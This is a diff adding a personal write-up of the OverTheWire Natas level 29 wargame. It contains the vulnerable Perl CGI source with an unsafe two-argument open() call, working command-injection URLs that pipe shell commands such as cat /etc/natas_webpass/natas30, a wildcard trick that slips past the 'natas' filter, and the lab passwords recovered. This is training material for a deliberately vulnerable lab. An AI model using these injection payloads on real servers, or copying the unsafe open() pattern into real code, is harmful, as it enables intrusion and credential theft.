@@ -837,3 +837,103 @@ Welcome natas28!<br>Here is your data:<br>Array
 - 2025-07-21 Break Day
 - 2025-07-22 Break Day
 - 2025-07-23 Break Day
+
+## 29->30
+- http://natas29.natas.labs.overthewire.org/
+- `natas30:WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`
+- https://learnhacking.io/overthewire-natas-level-29-walkthrough/
+- From PHP to Perl. Perl injection?
+- These work http://natas29.natas.labs.overthewire.org/index.pl?file=|pwd%00, http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
+- http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/natas_webpass/natas30%00 gives meeeeeeep! error, okay.
+```
+IyEvdXNyL2Jpbi9wZXJsCnVzZSBDR0kgcXcoOnN0YW5kYXJkKTsKCnByaW50IDw8RU5EOwpDb250 ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0xCgo8IURPQ1RZUEUgSFRNTCBQ VUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMS8vRU4iPgo8aGVhZD4KPCEtLSBUaGlzIHN0dWZm IGluIHRoZSBoZWFkZXIgaGFzIG5vdGhpbmcgdG8gZG8gd2l0aCB0aGUgbGV2ZWwgLS0+CjxsaW5r IHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Imh0dHA6Ly9uYXRhcy5sYWJz Lm92ZXJ0aGV3aXJlLm9yZy9jc3MvbGV2ZWwuY3NzIj4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBo cmVmPSJodHRwOi8vbmF0YXMubGFicy5vdmVydGhld2lyZS5vcmcvY3NzL2pxdWVyeS11aS5jc3Mi IC8+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cDovL25hdGFzLmxhYnMub3ZlcnRo ZXdpcmUub3JnL2Nzcy93ZWNoYWxsLmNzcyIgLz4KPHNjcmlwdCBzcmM9Imh0dHA6Ly9uYXRhcy5s YWJzLm92ZXJ0aGV3aXJlLm9yZy9qcy9qcXVlcnktMS45LjEuanMiPjwvc2NyaXB0Pgo8c2NyaXB0 IHNyYz0iaHR0cDovL25hdGFzLmxhYnMub3ZlcnRoZXdpcmUub3JnL2pzL2pxdWVyeS11aS5qcyI+ PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPWh0dHA6Ly9uYXRhcy5sYWJzLm92ZXJ0aGV3aXJlLm9yZy9q cy93ZWNoYWxsLWRhdGEuanM+PC9zY3JpcHQ+PHNjcmlwdCBzcmM9Imh0dHA6Ly9uYXRhcy5sYWJz Lm92ZXJ0aGV3aXJlLm9yZy9qcy93ZWNoYWxsLmpzIj48L3NjcmlwdD4KPHNjcmlwdD52YXIgd2Vj aGFsbGluZm8gPSB7ICJsZXZlbCI6ICJuYXRhczI5IiwgInBhc3MiOiAiMzFGNGozUWkyUG51aEla UW9reFhrMUwzUVQ5Q3BwbnMiIH07PC9zY3JpcHQ+PC9oZWFkPgo8Ym9keSBvbmNvbnRleHRtZW51 PSJqYXZhc2NyaXB0OmFsZXJ0KCdyaWdodCBjbGlja2luZyBoYXMgYmVlbiBibG9ja2VkIScpO3Jl dHVybiBmYWxzZTsiPgoKPHN0eWxlPgoKI2NvbnRlbnQgewogICAgd2lkdGg6IDEwMDBweDsKfQpw cmV7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOyAKICAgIGNvbG9yOiAjMDBGRjAwOyAK fSAKCjwvc3R5bGU+Cgo8aDE+bmF0YXMyOTwvaDE+CjxkaXYgaWQ9ImNvbnRlbnQiPgpFTkQKIwoj IG1vcmxhIC8xMDExMQojICckXz1xdy9sanR0ZnQzZHZ1ey8scy8uL3ByaW50IGNociBvcmQoJCYp LTEvZWcnCiMKIyBjcmVkaXRzIGZvciB0aGUgcHJldmlvdXMgbGV2ZWwgZ28gdG8gd2hvZXZlciAK IyBjcmVhdGVkIGluc29tbmloYWNrMjAxNi9mcmlkZ2luYXRvciwgd2hlcmUgaSBzdG9sZSB0aGUg aWRlYSBmcm9tLiAKIyB0aGF0IHdhcyBhIGZ1biBjaGFsbGVuZ2UsIFRoYW5rcyEgCiMKCnByaW50 IDw8RU5EOwpIM3kgSzFkWiw8YnI+CnkwIHJFbTNtQjNyeiBwM1JsIHJpdDM/PGJyPgpcXC9cXC80 Tm40IGcwIG9sRDVrZXdMPyBSM2FEIFVwITxicj48YnI+Cgo8Zm9ybSBhY3Rpb249ImluZGV4LnBs IiBtZXRob2Q9IkdFVCI+CjxzZWxlY3QgbmFtZT0iZmlsZSIgb25jaGFuZ2U9InRoaXMuZm9ybS5z dWJtaXQoKSI+CiAgPG9wdGlvbiB2YWx1ZT0iIj5zM2xFY1Qgc3VNcDFuITwvb3B0aW9uPgogIDxv cHRpb24gdmFsdWU9InBlcmwgdW5kZXJncm91bmQiPnBlcmwgdW5kZXJncm91bmQ8L29wdGlvbj4K ICA8b3B0aW9uIHZhbHVlPSJwZXJsIHVuZGVyZ3JvdW5kIDIiPnBlcmwgdW5kZXJncm91bmQgMjwv b3B0aW9uPgogIDxvcHRpb24gdmFsdWU9InBlcmwgdW5kZXJncm91bmQgMyI+cGVybCB1bmRlcmdy b3VuZCAzPC9vcHRpb24+CiAgPG9wdGlvbiB2YWx1ZT0icGVybCB1bmRlcmdyb3VuZCA0Ij5wZXJs IHVuZGVyZ3JvdW5kIDQ8L29wdGlvbj4KICA8b3B0aW9uIHZhbHVlPSJwZXJsIHVuZGVyZ3JvdW5k IDUiPnBlcmwgdW5kZXJncm91bmQgNTwvb3B0aW9uPgo8L3NlbGVjdD4KPC9mb3JtPgoKRU5ECgpp ZihwYXJhbSgnZmlsZScpKXsKICAgICRmPXBhcmFtKCdmaWxlJyk7CiAgICBpZigkZj1+L25hdGFz Lyl7CiAgICAgICAgcHJpbnQgIm1lZWVlZWVwITxicj4iOwogICAgfQogICAgZWxzZXsKICAgICAg ICBvcGVuKEZELCAiJGYudHh0Iik7CiAgICAgICAgcHJpbnQgIjxwcmU+IjsKICAgICAgICB3aGls ZSAoPEZEPil7CiAgICAgICAgICAgIHByaW50IENHSTo6ZXNjYXBlSFRNTCgkXyk7CiAgICAgICAg fQogICAgICAgIHByaW50ICI8L3ByZT4iOwogICAgfQp9CgpwcmludCA8PEVORDsKPGRpdiBpZD0i dmlld3NvdXJjZSI+YzRuIFkwIGg0eiBzNHVjMz88L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1s PgpFTkQK
+```
+
+```perl
+#!/usr/bin/perl
+use CGI qw(:standard);
+
+print <<END;
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas29", "pass": "31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns" };</script></head>
+<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
+
+<style>
+
+#content {
+    width: 1000px;
+}
+pre{
+    background-color: #000000; 
+    color: #00FF00; 
+} 
+
+</style>
+
+<h1>natas29</h1>
+<div id="content">
+END
+#
+# morla /10111
+# '$_=qw/ljttft3dvu{/,s/./print chr ord($&)-1/eg'
+#
+# credits for the previous level go to whoever 
+# created insomnihack2016/fridginator, where i stole the idea from. 
+# that was a fun challenge, Thanks! 
+#
+
+print <<END;
+H3y K1dZ,<br>
+y0 rEm3mB3rz p3Rl rit3?<br>
+\\/\\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>
+
+<form action="index.pl" method="GET">
+<select name="file" onchange="this.form.submit()">
+  <option value="">s3lEcT suMp1n!</option>
+  <option value="perl underground">perl underground</option>
+  <option value="perl underground 2">perl underground 2</option>
+  <option value="perl underground 3">perl underground 3</option>
+  <option value="perl underground 4">perl underground 4</option>
+  <option value="perl underground 5">perl underground 5</option>
+</select>
+</form>
+
+END
+
+if(param('file')){
+    $f=param('file');
+    if($f=~/natas/){
+        print "meeeeeep!<br>";
+    }
+    else{
+        open(FD, "$f.txt");
+        print "<pre>";
+        while (<FD>){
+            print CGI::escapeHTML($_);
+        }
+        print "</pre>";
+    }
+}
+
+print <<END;
+<div id="viewsource">c4n Y0 h4z s4uc3?</div>
+</div>
+</body>
+</html>
+END
+
+```
+- 
+- There are a few options here for bypassing disallowed strings, the one I found was inspired by this CTF writeup. It uses wildcards to match a directory or file name. We have command injection working, we know how the filtering works. To get the flag printed, we can swap out one character in each “natas” with a ?: `|cat /etc/n?tas_webpass/n?tas30 %00`
+- http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%20%00
+- WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
